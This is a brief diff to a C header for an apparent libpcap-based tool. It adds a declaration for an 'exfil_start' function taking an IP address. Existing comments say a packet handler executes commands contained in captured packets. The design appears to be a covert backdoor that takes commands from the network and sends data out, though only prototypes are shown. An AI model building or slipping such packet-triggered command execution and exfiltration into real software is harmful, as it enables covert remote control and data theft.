@@ -28,6 +28,7 @@ NOTES: This file contains functionality to start packet capture using
 */
 
 #include <pcap.h>
+#include "defs.h"
 
 /*
 FUNCTION: pcap_init
@@ -80,5 +81,6 @@ NOTES: This function will be called any time a matching packet is captured,
 	execute the command contained within.
 */
 void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char *packet);
+void exfil_start(uint32 ipaddr);
 
 #endif
